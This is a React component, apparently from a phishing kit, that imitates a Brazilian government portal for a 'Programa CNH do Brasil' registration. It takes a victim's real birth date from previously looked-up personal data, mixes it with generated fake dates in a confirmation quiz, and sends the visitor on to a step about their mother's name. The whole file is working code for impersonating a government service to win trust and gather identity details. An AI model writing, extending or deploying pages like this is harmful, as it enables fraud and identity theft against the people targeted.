import { useMemo, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "./StepBirth.css";

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function onlyDigits(v) {
  return String(v || "").replace(/\D/g, "");
}

// tenta pegar nascimento em vários formatos e normaliza pra DD/MM/AAAA
function pickNascimento(dados) {
  if (!dados) return "";

  const raw =
    dados.nascimento ||
    dados.data_nascimento ||
    dados.DataNascimento ||
    dados.birth_date ||
    (dados.Result &&
      (dados.Result.nascimento ||
        dados.Result.DataNascimento ||
        dados.Result.data_nascimento)) ||
    "";

  if (!raw) return "";

  // se já veio DD/MM/AAAA
  if (/^\d{2}\/\d{2}\/\d{4}$/.test(raw)) return raw;

  // se veio YYYY-MM-DD
  if (/^\d{4}-\d{2}-\d{2}$/.test(raw)) {
    const [y, m, d] = raw.split("-");
    return `${d}/${m}/${y}`;
  }

  // se veio só números (ex 01011990)
  const d = onlyDigits(raw);
  if (d.length === 8) {
    const dd = d.slice(0, 2);
    const mm = d.slice(2, 4);
    const yyyy = d.slice(4, 8);
    return `${dd}/${mm}/${yyyy}`;
  }

  return "";
}

function parseDDMMYYYY(dateStr) {
  if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dateStr)) return null;
  const [dd, mm, yyyy] = dateStr.split("/").map((n) => Number(n));
  if (!dd || !mm || !yyyy) return null;
  const dt = new Date(yyyy, mm - 1, dd);
  // valida se bate (evita 31/02 virar março)
  if (dt.getFullYear() !== yyyy || dt.getMonth() !== mm - 1 || dt.getDate() !== dd) return null;
  return dt;
}

function formatDDMMYYYY(dt) {
  const dd = String(dt.getDate()).padStart(2, "0");
  const mm = String(dt.getMonth() + 1).padStart(2, "0");
  const yyyy = String(dt.getFullYear());
  return `${dd}/${mm}/${yyyy}`;
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// gera uma data falsa perto da real (varia dia/mês/ano) sem duplicar
function genFakeBirth(realStr, usedSet) {
  const base = parseDDMMYYYY(realStr);
  if (!base) return null;

  for (let tries = 0; tries < 60; tries++) {
    const yearDelta = randomInt(-3, 3);
    const dayDelta = randomInt(-18, 18);
    const monthDelta = randomInt(-2, 2);

    const dt = new Date(base);
    dt.setFullYear(dt.getFullYear() + yearDelta);
    dt.setMonth(dt.getMonth() + monthDelta);
    dt.setDate(dt.getDate() + dayDelta);

    const s = formatDDMMYYYY(dt);
    if (!usedSet.has(s) && s !== realStr) {
      usedSet.add(s);
      return s;
    }
  }

  return null;
}

export default function StepBirth() {
  const location = useLocation();
  const navigate = useNavigate();

  const data = location.state;
  const [selected, setSelected] = useState("");

  const { nascimentoReal, opcoes } = useMemo(() => {
    const real = pickNascimento(data?.dados);
    const safeReal = real || "DATA NÃO ENCONTRADA";

    const used = new Set([safeReal]);

    let fakes = [];
    if (safeReal !== "DATA NÃO ENCONTRADA") {
      while (fakes.length < 3) {
        const fake = genFakeBirth(safeReal, used);
        if (!fake) break;
        fakes.push(fake);
      }
    }

    // se por algum motivo não conseguir gerar 3 (real inválida),
    // completa com placeholders (mantém layout e evita crash)
    while (fakes.length < 3) {
      fakes.push("00/00/0000");
    }

    return {
      nascimentoReal: safeReal,
      opcoes: shuffle([safeReal, ...fakes]),
    };
  }, [data]);

  if (!data) return <div className="step-loading">Carregando...</div>;

  const goNext = () => {
    if (!selected) return;

    navigate("/stepmother", {
      state: {
        ...data,
        nascimentoSelecionado: selected,
      },
    });
  };

  return (
    <div className="gov-page">
      {/* HEADER */}
      <header className="g-header">
        <div className="g-header-inner">
          <div className="g-left">
            <img className="g-logo" src="/logo.png" alt="Logo" />
            <button className="g-burger" type="button" aria-label="Menu">
              ☰
            </button>
            <a className="g-link" href="#" onClick={(e) => e.preventDefault()}>
              Programa CNH do Brasil
            </a>
          </div>

          <div className="g-right" aria-hidden="true">
            <span className="g-dot">⋮</span>
            <span className="g-circle">⦿</span>
            <span className="g-grid">⌗</span>
            <span className="g-avatar">●</span>
          </div>
        </div>
      </header>

      {/* CONTEÚDO */}
      <main className="g-main">
        <section className="g-card">
          <h1 className="g-card-title">
            Confirme seus dados para o cadastro no Programa CNH do Brasil
          </h1>

          <div className="g-steprow">
            <div className="g-stepcircle">2</div>
            <div className="g-question">Qual é sua data de nascimento?</div>
          </div>

          <div className="g-list" role="list">
            {opcoes.map((d, idx) => {
              const active = selected === d;
              return (
                <button
                  key={idx}
                  type="button"
                  className={`g-item ${active ? "is-active" : ""}`}
                  onClick={() => setSelected(d)}
                >
                  <span className="g-item-text">{d}</span>
                </button>
              );
            })}
          </div>

          <button
            className="g-confirm"
            type="button"
            disabled={!selected || nascimentoReal === "DATA NÃO ENCONTRADA"}
            onClick={goNext}
          >
            Confirmar
          </button>
        </section>
      </main>
    </div>
  );
}